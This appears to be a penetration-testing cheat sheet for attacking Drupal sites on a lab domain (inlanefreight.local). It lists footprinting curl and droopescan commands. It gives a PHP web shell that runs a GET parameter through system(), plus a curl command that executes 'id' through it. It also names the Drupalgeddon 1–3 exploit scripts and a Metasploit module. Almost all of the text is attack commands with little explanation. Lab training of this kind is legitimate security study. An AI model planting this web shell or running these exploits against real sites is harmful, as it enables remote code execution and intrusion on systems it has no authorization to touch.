# Discovery/Footprinting
```
curl -s http://drupal.inlanefreight.local | grep Drupal
curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 ""
```

# Droopescan
```
droopescan scan drupal -u http://drupal.inlanefreight.local
```

# RevShell
```
<?php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
?>
```

then

```
curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d">"
```

# Drupalgeddon
```
python2.7 drupalgeddon.py 
```

# Drupalgeddon2
```
python3 drupalgeddon2.py 
```

# Drupalgeddon3
```
exploit(multi/http/drupal_drupageddon3)
```
